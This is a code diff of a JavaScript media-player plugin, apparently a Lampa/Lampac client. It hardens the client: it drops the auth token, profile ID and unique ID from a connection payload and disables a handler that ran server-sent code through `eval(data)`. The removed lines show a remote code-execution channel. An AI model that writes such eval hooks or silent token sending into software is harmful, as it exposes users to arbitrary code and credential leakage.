@@ -182,12 +182,11 @@
 		apn: Config.Defined.apn
 	};
 
+	var existingUid = Lampa.Storage.get(Config.StorageKeys.LampacUnicId, "");
 	var MY_AUTH = {
 		lampa_uid: Config.Auth.LampaUid,
-		lampac_unic_id: Config.Auth.LampacUnicId
+		lampac_unic_id: existingUid || "guest"
 	};
-
-	Lampa.Storage.set(Config.StorageKeys.LampacUnicId, MY_AUTH.lampac_unic_id);
 
 	var balansers_with_search;
 	var balansers_with_search_promise;
@@ -321,14 +320,7 @@
 										? "cors"
 										: window.rch_nws[hk].type,
 								apkVersion: window.rch_nws[hk].apkVersion,
-								player: Lampa.Storage.field("player"),
-								account_email: "",
-								unic_id: MY_AUTH.lampac_unic_id,
-								profile_id: Lampa.Storage.get(
-									Config.StorageKeys.LampacProfileId,
-									""
-								),
-								token: Config.Auth.Token
+								player: Lampa.Storage.field("player")
 							})
 						);
 
@@ -355,8 +347,9 @@
 									}
 									client.invoke("RchResult", rchId, html);
 								}
-								if (url == "eval") result(eval(data));
-								else if (url == "ping") result("pong");
+								if (url == "eval") {
+									result("");
+								} else if (url == "ping") result("pong");
 								else {
 									network["native"](
 										url,
